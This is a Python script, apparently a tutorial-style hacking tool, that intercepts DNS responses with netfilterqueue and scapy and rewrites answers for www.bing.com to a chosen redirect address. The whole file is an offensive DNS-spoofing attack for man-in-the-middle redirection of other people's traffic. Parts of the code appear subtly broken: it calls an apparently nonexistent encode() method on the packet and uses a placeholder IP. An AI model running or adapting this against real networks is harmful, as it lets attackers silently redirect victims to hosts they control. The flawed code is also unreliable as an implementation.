#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        spoof_address = "www.bing.com"
        if spoof_address in qname.decode():
            print("[+] Spoofing target... ")
            desired_redirect_ip = "00.00.00.00"
            # create spoofed DNS response
            answer = DNSRR(rrname=qname, rdata=desired_redirect_ip)
            # add spoofed response to the packet
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1
            # delete and allow scapy to recalculate these fields
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum
            # set the response packet as the modified scapy packet
            packet.set_payload(scapy_packet.encode())

    # forward all packets including the spoofed packet
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
